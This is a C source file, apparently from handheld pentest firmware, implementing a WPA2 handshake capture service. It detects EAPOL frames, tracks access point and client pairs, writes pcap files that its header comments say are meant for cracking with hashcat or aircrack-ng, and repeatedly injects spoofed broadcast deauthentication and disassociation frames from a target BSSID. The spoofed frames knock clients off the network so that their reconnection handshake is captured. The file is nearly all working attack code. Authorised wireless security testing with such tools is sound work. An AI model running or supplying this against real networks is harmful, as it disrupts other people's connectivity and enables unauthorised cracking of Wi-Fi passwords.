/*
 * wifi_eapol_svc.c - WPA2 EAPOL handshake capture service.
 *
 * EAPOL detection (IEEE 802.1X-2010 / RFC 4017):
 *   802.11 data frames carry EAPOL via LLC/SNAP encapsulation.
 *   Non-QoS data (FC byte 0 subtype 0-7): LLC/SNAP at frame offset 24.
 *   QoS data    (FC byte 0 subtype bit3 set, e.g. 0x88): 2-byte QoS Control
 *   field shifts LLC/SNAP to offset 26.
 *   Pattern: AA AA 03  00 00 00  88 8E  (LLC + SNAP EtherType 0x888E)
 *
 * Handshake pair tracking:
 *   AP → STA:  FC[1] bit1 (FromDS)=1, bit0 (ToDS)=0  → Addr2 = AP BSSID
 *   STA → AP:  FC[1] bit0 (ToDS)=1,   bit1 (FromDS)=0 → Addr1 = AP BSSID
 *   A pair is "complete" once we see EAPOL frames in both directions (M1+M2
 *   minimum).  Both together constitute a crackable handshake for hashcat
 *   (-m 22000) or aircrack-ng.
 *
 * Deauth injection:
 *   Broadcast deauth (reason 7, "class 3 frame from non-associated STA")
 *   spoofed from the target BSSID.  This causes associated clients to enter
 *   the unauthenticated state and begin a fresh 802.11 Open Authentication →
 *   Association → 4-way EAPOL handshake sequence that we capture.
 *   Sent every deauth_ivl_ms (default 5 s), matching the approach validated
 *   in the Evil-M5 reference firmware.
 *
 * pcap output:
 *   libpcap global header + per-packet headers written via bs_fs.
 *   Link type 105 (LINKTYPE_IEEE802_11) — raw 802.11 frames without radiotap.
 *   Compatible with hashcat -m 22000 after conversion with hcxpcapngtool, and
 *   directly usable by aircrack-ng / Wireshark.
 */
#include "bs/bs_wifi.h"
#ifdef BS_HAS_WIFI

#include "wifi_eapol_svc.h"
#include "wifi_sniffer_svc.h"
#include "wifi_common.h"
#include "bs/bs_fs.h"

#include <string.h>
#include <stdbool.h>
#include <stdint.h>

/* ── Tunables ────────────────────────────────────────────────────────────── */

#define EAPOL_DEAUTH_DEFAULT_IVL_MS  5000
#define EAPOL_DEAUTH_BURST           3
#define EAPOL_MAX_PAIRS              16   /* BSSID+STA pairs tracked */

/* ── Per-pair handshake record ──────────────────────────────────────────── */

typedef struct {
    uint8_t bssid[6];
    uint8_t sta[6];
    uint8_t flags;    /* bit 0: AP→STA seen (M1/M3 direction), bit 1: STA→AP seen */
} eapol_pair_t;

/* ── State ─────────────────────────────────────────────────────────────── */

static bool               s_active         = false;
static uint8_t            s_target_bssid[6];
static bool               s_has_bssid      = false;
static bool               s_do_deauth      = false;
static uint32_t           s_deauth_ivl_ms  = EAPOL_DEAUTH_DEFAULT_IVL_MS;
static uint32_t           s_last_deauth_ms = 0;

static uint32_t           s_eapol_count    = 0;
static int                s_pair_count     = 0;
static eapol_pair_t       s_pairs[EAPOL_MAX_PAIRS];

static bs_file_t          s_pcap_f         = NULL;
static uint32_t           s_pcap_frames    = 0;

/* ── pcap helpers ───────────────────────────────────────────────────────── */

static void pcap_open(const char* path) {
    s_pcap_f = bs_fs_open(path, "w");
    if (!s_pcap_f) return;
    /* libpcap global header (little-endian), DLT_IEEE802_11 = 105 */
    static const uint8_t k_hdr[24] = {
        0xd4,0xc3,0xb2,0xa1,  /* magic 0xa1b2c3d4 LE */
        0x02,0x00, 0x04,0x00, /* version 2.4 */
        0x00,0x00,0x00,0x00,  /* thiszone 0 */
        0x00,0x00,0x00,0x00,  /* sigfigs 0 */
        0xff,0xff,0x00,0x00,  /* snaplen 65535 */
        0x69,0x00,0x00,0x00,  /* DLT_IEEE802_11 = 105 */
    };
    bs_fs_write(s_pcap_f, k_hdr, 24);
    s_pcap_frames = 0;
}

static void pcap_write(const uint8_t* data, uint16_t len, uint32_t ts_ms) {
    if (!s_pcap_f) return;
    uint32_t hdr[4];
    hdr[0] = ts_ms / 1000;
    hdr[1] = (ts_ms % 1000) * 1000;
    hdr[2] = hdr[3] = (uint32_t)len;
    bs_fs_write(s_pcap_f, hdr, 16);
    bs_fs_write(s_pcap_f, data, len);
    s_pcap_frames++;
}

static void pcap_close(void) {
    if (s_pcap_f) {
        bs_fs_close(s_pcap_f);
        s_pcap_f = NULL;
    }
}

/* ── EAPOL detection ────────────────────────────────────────────────────── */

/*
 * Returns true if the frame contains an EAPOL payload (ethertype 0x888E via
 * LLC/SNAP).  Handles both non-QoS (subtype 0-7) and QoS data (subtype 8-15).
 */
static bool is_eapol(const uint8_t* frame, uint16_t len) {
    if (len < 24 + 8 + 4) return false;
    /* Must be a data frame (FC type bits [3:2] = 0b10) */
    if (((frame[0] >> 2) & 0x03) != 2) return false;
    /* QoS data: FC byte 0 bit 3 = 1 (subtype 0x08..0x0F) → LLC at +26 */
    int offs = ((frame[0] & 0x08) != 0) ? 26 : 24;
    if ((uint16_t)(offs + 8) > len) return false;
    return (frame[offs+0] == 0xAA && frame[offs+1] == 0xAA &&
            frame[offs+2] == 0x03 && frame[offs+3] == 0x00 &&
            frame[offs+4] == 0x00 && frame[offs+5] == 0x00 &&
            frame[offs+6] == 0x88 && frame[offs+7] == 0x8E);
}

/* ── Pair tracking ──────────────────────────────────────────────────────── */

/*
 * direction: 0 = AP→STA (bit 0), 1 = STA→AP (bit 1)
 * returns true if this is a newly-complete pair (both directions now seen).
 */
static bool pair_update(const uint8_t bssid[6], const uint8_t sta[6],
                        int direction) {
    /* Find existing pair */
    for (int i = 0; i < s_pair_count; i++) {
        if (memcmp(s_pairs[i].bssid, bssid, 6) == 0 &&
            memcmp(s_pairs[i].sta,   sta,   6) == 0) {
            uint8_t old_flags = s_pairs[i].flags;
            s_pairs[i].flags |= (uint8_t)(1 << direction);
            /* newly complete = was missing one direction, now has both */
            return (old_flags != 0x03 && s_pairs[i].flags == 0x03);
        }
    }
    /* New pair */
    if (s_pair_count < EAPOL_MAX_PAIRS) {
        memcpy(s_pairs[s_pair_count].bssid, bssid, 6);
        memcpy(s_pairs[s_pair_count].sta,   sta,   6);
        s_pairs[s_pair_count].flags = (uint8_t)(1 << direction);
        s_pair_count++;
    }
    return false;
}

/* ── Sniffer callback ───────────────────────────────────────────────────── */

static void eapol_pkt_cb(const uint8_t* frame, uint16_t len,
                         int8_t rssi, uint32_t ts_ms, void* ctx) {
    (void)rssi; (void)ctx;
    if (!is_eapol(frame, len)) return;
    if (len < 22) return;  /* need at least addresses */

    /* Extract BSSID (Addr3), direction, and STA MAC */
    const uint8_t* bssid = frame + 16;  /* Addr3 = BSSID */
    uint8_t fc1      = frame[1];
    bool    from_ds  = (fc1 & 0x02) != 0;
    bool    to_ds    = (fc1 & 0x01) != 0;

    /* Filter by BSSID if requested */
    if (s_has_bssid && memcmp(bssid, s_target_bssid, 6) != 0) return;

    /* Determine STA address and direction */
    const uint8_t* sta_mac;
    int direction;
    if (from_ds && !to_ds) {
        /* AP → STA: Addr1=STA(DA), Addr2=BSSID(SA) */
        sta_mac   = frame + 4;   /* Addr1 */
        direction = 0;           /* AP→STA */
    } else if (!from_ds && to_ds) {
        /* STA → AP: Addr1=BSSID(DA), Addr2=STA(SA) */
        sta_mac   = frame + 10;  /* Addr2 */
        direction = 1;           /* STA→AP */
    } else {
        /* IBSS or WDS — treat as STA→AP direction for pair tracking */
        sta_mac   = frame + 10;
        direction = 1;
    }

    s_eapol_count++;

    /* Write raw frame to pcap (includes both M1 and M2 as separate records) */
    pcap_write(frame, len, ts_ms);

    /* Track pair completion */
    if (pair_update(bssid, sta_mac, direction)) {
        s_pair_count = s_pair_count;  /* already incremented inside */
    }
}

/* ── Deauth injection ───────────────────────────────────────────────────── */

static void do_deauth_burst(void) {
    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t frame[DEAUTH_FRAME_LEN];
    for (int i = 0; i < EAPOL_DEAUTH_BURST; i++) {
        /* Deauth: DA=broadcast, SA=BSSID, BSSID=BSSID, reason=7 */
        wifi_build_deauth(frame, bcast, s_target_bssid, s_target_bssid, 7);
        bs_wifi_send_raw(BS_WIFI_IF_STA, frame, DEAUTH_FRAME_LEN);
        /* Disassoc as well — transitions client to state 2 */
        wifi_build_disassoc(frame, bcast, s_target_bssid, s_target_bssid, 7);
        bs_wifi_send_raw(BS_WIFI_IF_STA, frame, DEAUTH_FRAME_LEN);
    }
}

/* ── Lifecycle ─────────────────────────────────────────────────────────── */

void eapol_svc_init(const bs_arch_t* arch) {
    (void)arch;
    sniffer_svc_init(arch);
}

bool eapol_svc_start(uint8_t channel, const uint8_t* bssid,
                     bool do_deauth, uint32_t deauth_ivl,
                     const char* pcap_path) {
    if (s_active) eapol_svc_stop();

    if (bssid) {
        memcpy(s_target_bssid, bssid, 6);
        s_has_bssid = true;
    } else {
        s_has_bssid = false;
    }

    s_do_deauth     = do_deauth;
    s_deauth_ivl_ms = (deauth_ivl > 0) ? deauth_ivl : EAPOL_DEAUTH_DEFAULT_IVL_MS;
    s_last_deauth_ms = 0;

    s_eapol_count = 0;
    s_pair_count  = 0;
    memset(s_pairs, 0, sizeof s_pairs);

    if (pcap_path) pcap_open(pcap_path);

    sniffer_svc_start(channel, 500, eapol_pkt_cb, NULL);
    s_active = true;
    return true;
}

void eapol_svc_stop(void) {
    sniffer_svc_stop();
    pcap_close();
    s_active = false;
}

void eapol_svc_tick(uint32_t now_ms) {
    if (!s_active) return;
    sniffer_svc_tick(now_ms);
    if (s_do_deauth && s_has_bssid) {
        if (s_last_deauth_ms == 0 ||
            (now_ms - s_last_deauth_ms) >= s_deauth_ivl_ms) {
            s_last_deauth_ms = now_ms;
            do_deauth_burst();
        }
    }
}

/* ── Getters ────────────────────────────────────────────────────────────── */

bool     eapol_svc_active(void)      { return s_active; }
uint32_t eapol_svc_eapol_count(void) { return s_eapol_count; }
int      eapol_svc_pair_count(void)  { return s_pair_count; }
uint32_t eapol_svc_pcap_frames(void) { return s_pcap_frames; }

#endif /* BS_HAS_WIFI */
